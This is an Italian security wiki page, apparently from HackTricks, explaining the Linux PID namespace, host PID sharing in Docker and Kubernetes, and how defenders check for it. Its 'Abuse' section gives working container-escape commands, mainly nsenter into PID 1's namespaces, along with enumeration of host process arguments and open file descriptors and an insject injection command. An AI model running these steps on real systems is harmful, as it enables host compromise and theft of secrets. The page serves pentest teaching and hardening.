# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il PID namespace controlla il modo in cui vengono numerati i processi e quali processi sono visibili. Per questo un container può avere il proprio PID 1 anche se non è una macchina reale. All'interno del namespace, il workload vede quello che appare come un albero dei processi locale. All'esterno del namespace, l'host continua a vedere i PID reali dell'host e l'intero panorama dei processi.

Dal punto di vista della sicurezza, il PID namespace è importante perché la visibilità dei processi è preziosa. Quando un workload può vedere i processi dell'host, potrebbe essere in grado di osservare i nomi dei servizi, gli argomenti della command line, i secret passati negli argomenti dei processi, lo stato derivato dall'environment tramite `/proc` e potenziali target per l'ingresso nei namespace. Se può fare qualcosa in più della semplice visualizzazione di questi processi, ad esempio inviando signal o usando ptrace nelle condizioni corrette, il problema diventa molto più serio.

## Funzionamento

Un nuovo PID namespace inizia con una propria numerazione interna dei processi. Il primo processo creato al suo interno diventa il PID 1 dal punto di vista del namespace, il che significa anche che riceve semantiche speciali simili a quelle di init per i processi figli orfani e per il comportamento dei signal. Questo spiega molte particolarità dei container relative ai processi init, alla raccolta dei processi zombie e al motivo per cui nei container vengono talvolta usati piccoli wrapper init.

L'importante lezione di sicurezza è che un processo può sembrare isolato perché vede solo il proprio albero dei PID, ma questo isolamento può essere rimosso deliberatamente. Docker espone questa funzionalità tramite `--pid=host`, mentre Kubernetes lo fa tramite `hostPID: true`. Quando il container entra nel PID namespace dell'host, il workload vede direttamente i processi dell'host e molti successivi attack path diventano molto più realistici.

## Laboratorio

Per creare manualmente un PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
La shell ora vede una vista privata dei processi. Il flag `--mount-proc` è importante perché monta un'istanza di procfs che corrisponde al nuovo PID namespace, rendendo coerente l'elenco dei processi dall'interno.

Per confrontare il comportamento dei container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La differenza è immediata e facile da comprendere, ed è per questo che questo è un buon primo lab per i lettori.

## Utilizzo a runtime

I container normali in Docker, Podman, containerd e CRI-O ricevono il proprio namespace PID. Anche i Kubernetes Pod ricevono generalmente una vista PID isolata, a meno che il workload non richieda esplicitamente la condivisione del PID dell'host. Gli ambienti LXC/Incus si basano sulla stessa primitiva del kernel, anche se i casi d'uso dei system-container possono esporre alberi dei processi più complessi e incoraggiare più scorciatoie di debugging.

La stessa regola si applica ovunque: se il runtime ha scelto di non isolare il namespace PID, si tratta di una riduzione deliberata del confine del container.

## Misconfigurazioni

La misconfigurazione canonica è la condivisione del PID dell'host. I team la giustificano spesso per comodità di debugging, monitoring o gestione dei servizi, ma dovrebbe sempre essere considerata un'eccezione di sicurezza significativa. Anche se il container non dispone di una primitiva immediata di scrittura sui processi dell'host, la sola visibilità può rivelare molte informazioni sul sistema. Una volta aggiunte capability come `CAP_SYS_PTRACE` o un accesso utile a procfs, il rischio aumenta significativamente.

Un altro errore consiste nel presumere che, poiché il workload non può uccidere o eseguire ptrace sui processi dell'host per impostazione predefinita, la condivisione del PID dell'host sia quindi innocua. Questa conclusione ignora il valore dell'enumeration, la disponibilità di target per `nsenter` e il modo in cui la visibilità dei PID si combina con altri controlli indeboliti.

## Abuse

Se il namespace PID dell'host è condiviso, un attaccante può ispezionare i processi dell'host, acquisire gli argomenti dei processi, identificare servizi interessanti, individuare PID candidati per `nsenter` o combinare la visibilità dei processi con privilegi correlati a ptrace per interferire con i workload dell'host o con quelli adiacenti. In alcuni casi, vedere semplicemente il processo long-running corretto è sufficiente per ridefinire il resto del piano di attacco.

Il primo passaggio pratico consiste sempre nel confermare che i processi dell'host siano realmente visibili:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una volta visibili i PID dell'host, gli argomenti dei processi e i target di ingresso nei namespace diventano spesso la fonte di informazioni più utile:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se `nsenter` è disponibile e si dispone di privilegi sufficienti, verificare se un processo host visibile può essere utilizzato come ponte per i namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Anche quando l'ingresso è bloccato, la condivisione dei PID dell'host è già preziosa perché rivela la struttura dei servizi, i componenti runtime e i potenziali processi privilegiati da prendere di mira successivamente.

La visibilità dei PID dell'host rende inoltre più realistico l'abuso dei file descriptor. Se un processo privilegiato dell'host o un workload adiacente ha aperto un file o un socket sensibile, l'attaccante potrebbe essere in grado di ispezionare `/proc/<pid>/fd/` e riutilizzare quell'handle, a seconda della proprietà, delle opzioni di mount di procfs e del modello del servizio target.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Questi comandi sono utili perché indicano se `hidepid=1` o `hidepid=2` stanno riducendo la visibilità tra processi e se descrittori evidentemente interessanti, come file segreti aperti, log o socket Unix, sono visibili.

### Esempio completo: PID dell'host + `nsenter`

La condivisione dei PID dell'host diventa una fuga diretta dall'host quando il processo dispone anche di privilegi sufficienti per entrare nei namespace dell'host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se il comando ha esito positivo, il processo del container viene ora eseguito nei namespace mount, UTS, network, IPC e PID dell'host. L'impatto è una compromissione immediata dell'host.

Anche quando `nsenter` non è presente, lo stesso risultato può essere ottenuto tramite il binario dell'host se il filesystem dell'host è montato:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Note recenti sul runtime

Alcuni attacchi rilevanti per i PID namespace non sono le tradizionali misconfigurazioni `hostPID: true`, ma bug nell'implementazione del runtime relativi al modo in cui le protezioni di procfs vengono applicate durante la configurazione del container.

#### Race di `maskedPaths` verso il procfs dell'host

Nelle versioni vulnerabili di `runc`, gli attacker in grado di controllare la container image o il workload di `runc exec` potevano sfruttare una race nella masking phase sostituendo il `/dev/null` del container con un symlink verso un percorso procfs sensibile, come `/proc/sys/kernel/core_pattern`. Se la race aveva successo, il masked-path bind mount poteva finire sul target errato ed esporre al nuovo container i knob procfs globali dell'host.<sup>[[1]](#references)</sup>

Comando utile per la revisione:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Questo è importante perché l'impatto finale potrebbe essere lo stesso di un'esposizione diretta di procfs: `core_pattern` o `sysrq-trigger` scrivibili, seguiti da host code execution o denial of service.

#### Namespace injection con `insject`

Gli strumenti di Namespace injection come `insject` dimostrano che l'interazione con il PID namespace non richiede sempre di entrare nel namespace target prima della creazione del processo. Un helper può collegarsi successivamente, usare `setns()` ed eseguire codice mantenendo la visibilità nel PID space target:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Questo tipo di tecnica è importante soprattutto per il debugging avanzato, gli strumenti offensivi e i workflow di post-exploitation in cui il contesto del namespace deve essere unito dopo che il runtime ha già inizializzato il workload.

### Pattern correlati di abuso degli FD

È opportuno evidenziare esplicitamente due pattern quando i PID dell'host sono visibili. Primo, un processo privilegiato può mantenere aperto un file descriptor sensibile attraverso `execve()` perché non era stato contrassegnato con `O_CLOEXEC`. Secondo, i servizi possono passare file descriptor attraverso socket Unix tramite `SCM_RIGHTS`. In entrambi i casi, l'oggetto interessante non è più il pathname, ma l'handle già aperto che un processo con privilegi inferiori può ereditare o ricevere.

Questo è importante nel lavoro con i container perché l'handle può puntare a `docker.sock`, a un log privilegiato, a un file contenente un secret dell'host o a un altro oggetto di alto valore, anche quando il path stesso non è direttamente raggiungibile dal filesystem del container.

## Controlli

Lo scopo di questi comandi è determinare se il processo dispone di una vista PID privata oppure se può già enumerare un panorama dei processi molto più ampio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Cosa è interessante qui:

- Se l'elenco dei processi contiene servizi dell'host chiaramente riconoscibili, probabilmente la condivisione dei PID dell'host è già attiva.
- Visualizzare solo un albero molto piccolo e locale al container è il comportamento normale di base; visualizzare `systemd`, `dockerd` o daemon non correlati non lo è.
- Una volta visibili i PID dell'host, anche le informazioni sui processi in sola lettura diventano utili per la ricognizione.

Se scopri un container in esecuzione con la condivisione dei PID dell'host, non considerarla una semplice differenza estetica. Cambia significativamente ciò che il workload può osservare e potenzialmente influenzare.

## Riferimenti

- [1] [runc security advisory: container escape via "masked path" abuse due to mount race conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: A Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
